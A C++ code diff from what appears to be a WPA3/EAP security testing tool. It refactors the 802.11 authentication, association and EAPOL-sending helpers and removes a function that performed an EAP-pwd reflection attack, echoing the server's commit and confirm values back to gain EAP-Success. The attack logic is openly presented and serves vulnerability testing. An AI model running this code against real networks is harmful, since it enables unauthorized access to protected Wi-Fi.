@@ -1,5 +1,4 @@
-#include "attacks/Enterprise/eap_pwd_reflection.h"
-#include "attacks/Enterprise/eap_defs.h"
+#include "attacks/Enterprise/eap_helper.h"
 
 #include <chrono>
 #include <tins/llc.h>
@@ -7,7 +6,8 @@
 
 #include "attacks/sae_helper.h"
 #include "attacks/components/sniffer_helper.h"
-#include "attacks/DoS_hard/dos_helpers.h"
+#include "attacks/Enterprise/eap_defs.h"
+#include "attacks/mc_mitm/MonitorSocket.h"
 #include "logger/log.h"
 
 namespace wpa3_tester::reflection {
@@ -128,32 +128,29 @@ vector<uint8_t> reflect_confirm(const EapPwdFrame& request){
 	return reflect_pwd_frame(request, PWD_OPCODE_CONFIRM);
 }
 
-bool do_auth(MonitorSocket& sock, const Channel& ch,
-			const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac, const milliseconds timeout){
+bool do_auth(EAP_Att &eap_att){
+
 	Dot11Authentication auth;
-	auth.addr1(ap_mac);
-	auth.addr2(our_mac);
-	auth.addr3(ap_mac);
-	auth.auth_algorithm(0);      // Open System
+	auth.addr1(eap_att.ap_mac);
+	auth.addr2(eap_att.att_mac);
+	auth.addr3(eap_att.ap_mac);
+	auth.auth_algorithm(0); // Open System
 	auth.auth_seq_number(1);
 	auth.status_code(0);
 
-	pcap_t* handle = sock.get_pcap_handle();
-	const auto deadline = steady_clock::now() + timeout;
+	const auto deadline = steady_clock::now() + eap_att.timeout;
 
 	while(steady_clock::now() < deadline){
 		RadioTap rt{};
 		rt.inner_pdu(auth);
-		sock.send(rt, ch);
-
-		const auto wait = min(milliseconds{200},
-			duration_cast<milliseconds>(deadline - steady_clock::now()));
+		eap_att.sock.send(rt, eap_att.channel);
 
 		optional<bool> result;
-		(void)components::poll_sniffer<bool>(handle, wait,
+		const auto start_time = steady_clock::now();
+		(void)components::poll_sniffer<bool>(eap_att.sock.get_pcap_handle(), eap_att.timeout,
 			[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
 				const auto f = sae_helper::parse_auth_frame(p, caplen);
-				if(!f || f->addr1 != our_mac || f->seq != 2) return nullopt;
+				if(!f || f->addr1 != eap_att.att_mac || f->seq != 2) return nullopt;
 				log(LogLevel::DEBUG, "Auth response: algo={} seq={} status={}",
 					static_cast<int>(f->algorithm), static_cast<int>(f->seq), static_cast<int>(f->status));
 				if(f->status != 0){
@@ -165,17 +162,15 @@ bool do_auth(MonitorSocket& sock, const Channel& ch,
 				result = true;
 				return true;
 			});
+		eap_att.decrease_timeout(start_time);
 
 		if(result.has_value()) return *result;
-		// poll_sniffer timed out → retransmit
 	}
 	log(LogLevel::WARNING, "Auth timeout");
 	return false;
 }
 
-bool do_assoc(MonitorSocket& sock, const Channel& ch,
-			const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
-			const string_view ssid, const milliseconds timeout){
+bool do_assoc(EAP_Att &eap_att){
 	// RSN IE for WPA2 / 802.1X (AKM=1, pairwise=CCMP, group=CCMP)
 	static const vector<uint8_t> rsn_ie = {
 		0x01, 0x00,             // version 1
@@ -188,35 +183,36 @@ bool do_assoc(MonitorSocket& sock, const Channel& ch,
 	};
 
 	Dot11AssocRequest assoc;
-	assoc.addr1(ap_mac);
-	assoc.addr2(our_mac);
-	assoc.addr3(ap_mac);
+	assoc.addr1(eap_att.ap_mac);
+	assoc.addr2(eap_att.att_mac);
+	assoc.addr3(eap_att.ap_mac);
 	assoc.capabilities().ess(true);
 	assoc.capabilities().short_preamble(true);
 	assoc.capabilities().sst(true);
 	assoc.listen_interval(10);
-	assoc.add_option(
-		{Dot11::SSID,static_cast<uint32_t>(ssid.size()), reinterpret_cast<const uint8_t*>(ssid.data())});
+	assoc.add_option({
+		Dot11::SSID,
+		static_cast<uint32_t>(eap_att.ssid.size()),
+		reinterpret_cast<const uint8_t*>(eap_att.ssid.data())
+	});
 	static const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
 	assoc.add_option({Dot11::SUPPORTED_RATES, sizeof(rates), rates});
 	assoc.add_option({Dot11::RSN, static_cast<uint32_t>(rsn_ie.size()), rsn_ie.data()});
 
-	pcap_t* handle = sock.get_pcap_handle();
-	const auto deadline = steady_clock::now() + timeout;
+	pcap_t* handle = eap_att.sock.get_pcap_handle();
+	const auto deadline = steady_clock::now() + eap_att.timeout;
 
 	while(steady_clock::now() < deadline){
-		sock.send(assoc, ch);
-
-		const auto wait = min(milliseconds{200},
-			duration_cast<milliseconds>(deadline - steady_clock::now()));
+		eap_att.sock.send(assoc, eap_att.channel);
 
 		optional<bool> result;
-		(void)components::poll_sniffer<bool>(handle, wait,
+		const auto start_time = steady_clock::now();
+		(void)components::poll_sniffer<bool>(handle, eap_att.timeout,
 			[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
 				auto [pdu, raw] = MonitorSocket::parse_frame(p, caplen);
 				if(!pdu) return nullopt;
 				const auto* resp = pdu->find_pdu<Dot11AssocResponse>();
-				if(!resp || resp->addr1() != our_mac) return nullopt;
+				if(!resp || resp->addr1() != eap_att.att_mac) return nullopt;
 				if(resp->status_code() != 0){
 					log(LogLevel::WARNING, "Assoc rejected, status={}", static_cast<int>(resp->status_code()));
 					result = false; return true;
@@ -224,6 +220,7 @@ bool do_assoc(MonitorSocket& sock, const Channel& ch,
 				log(LogLevel::INFO, "802.11 Association OK");
 				result = true; return true;
 			});
+		eap_att.decrease_timeout(start_time);
 
 		if(result.has_value()) return *result;
 		// poll_sniffer timed out → retransmit
@@ -232,9 +229,7 @@ bool do_assoc(MonitorSocket& sock, const Channel& ch,
 	return false;
 }
 
-void send_eapol(MonitorSocket& sock, const Channel& ch,
-				const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
-				const vector<uint8_t>& eapol){
+void send_eapol(const EAP_Att &eap_att, const vector<uint8_t>& eapol){
 	// SNAP OUI(3) + EtherType(2) – same pattern as malformed_eapol1
 	vector<uint8_t> snap_eapol = {0x00, 0x00, 0x00, 0x88, 0x8e};
 	snap_eapol.insert(snap_eapol.end(), eapol.begin(), eapol.end());
@@ -245,14 +240,14 @@ void send_eapol(MonitorSocket& sock, const Channel& ch,
 	llc.modifier_function(LLC::UI);
 
 	Dot11Data dot11;
-	dot11.addr1(ap_mac);
-	dot11.addr2(our_mac);
-	dot11.addr3(ap_mac);
+	dot11.addr1(eap_att.ap_mac);
+	dot11.addr2(eap_att.att_mac);
+	dot11.addr3(eap_att.ap_mac);
 	dot11.to_ds(1);
 	dot11.from_ds(0);
 	dot11.inner_pdu(llc);
 
-	sock.send(dot11, ch);
+	eap_att.sock.send(dot11, eap_att.channel);
 }
 
 vector<uint8_t> extract_eapol(const uint8_t* p, const uint32_t caplen, const HWAddress<6>& our_mac){
@@ -286,98 +281,6 @@ vector<uint8_t> extract_eapol(const uint8_t* p, const uint32_t caplen, const HWA
 	if(eapol_end > caplen) return {};
 
 	return {p + eapol_off, p + eapol_end};
-}
-
-bool run_reflection_exchange(MonitorSocket& sock, const Channel& channel,
-							const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
-							const string_view ssid, const string_view identity,
-							const seconds timeout){
-	const milliseconds step_ms{3000};
-
-	if(!do_auth(sock, channel, our_mac, ap_mac, step_ms))  return false;
-	if(!do_assoc(sock, channel, our_mac, ap_mac, ssid, step_ms)) return false;
-
-	pcap_t* handle = sock.get_pcap_handle();
-
-	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
-	// returns nullopt on timeout or interrupt.
-	auto wait_eapol = [&](auto pred) -> optional<vector<uint8_t>> {
-		optional<vector<uint8_t>> result;
-		(void)components::poll_sniffer<bool>(handle, timeout,
-			[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
-				auto eapol = extract_eapol(p, caplen, our_mac);
-				if(eapol.empty()) return nullopt;
-				if(is_eap_success(eapol)){ result = vector<uint8_t>{}; return true; }
-				if(!pred(eapol)) return nullopt;
-				result = std::move(eapol);
-				return true;
-			});
-		return result;
-	};
-
-	// IDENTITY
-	{
-		uint8_t eap_id = 0;
-		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<int>(eap_id));
-		send_eapol(sock, channel, our_mac, ap_mac, build_identity_response(eap_id, identity));
-	}
-
-	// PWD-ID
-	{
-		optional<EapPwdFrame> frame;
-		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){
-			const auto f = parse_eap_pwd(e);
-			if(f && f->opcode == PWD_OPCODE_ID){ frame = f; return true; }
-			return false;
-		});
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-PWD-ID Request");
-		send_eapol(sock, channel, our_mac, ap_mac, build_pwd_id_response(*frame, identity));
-	}
-
-	// COMMIT
-	{
-		optional<EapPwdFrame> frame;
-		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){
-			auto f = parse_eap_pwd(e);
-			if(f && f->opcode == PWD_OPCODE_COMMIT){ frame = f; return true; }
-			return false;
-		});
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
-		send_eapol(sock, channel, our_mac, ap_mac, reflect_commit(*frame));
-	}
-
-	// CONFIRM
-	{
-		optional<EapPwdFrame> frame;
-		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){
-			const auto f = parse_eap_pwd(e);
-			if(f && f->opcode == PWD_OPCODE_CONFIRM){ frame = f; return true; }
-			return false;
-		});
-		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
-		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
-		send_eapol(sock, channel, our_mac, ap_mac, reflect_confirm(*frame));
-	}
-
-	// Wait for EAP-Success after confirm
-	{
-		const auto eapol = wait_eapol([](const vector<uint8_t>&){ return false; });
-		if(eapol && eapol->empty()){
-			log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!");
-			return true;
-		}
-	}
-
-	log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success");
-	return false;
 }
 
 }
